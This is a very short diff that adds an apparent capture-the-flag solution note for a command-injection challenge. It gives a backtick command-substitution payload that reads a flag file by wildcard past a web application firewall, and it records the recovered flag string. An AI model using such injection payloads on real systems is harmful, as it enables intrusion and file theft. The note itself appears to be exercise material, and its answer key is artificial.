@@ -1,0 +1,6 @@
+1.command substitution
+'`cat /fla*`'
+
+2.
+FLAG{Y0U_$(Byp4ssed)_th3_`waf`}
+
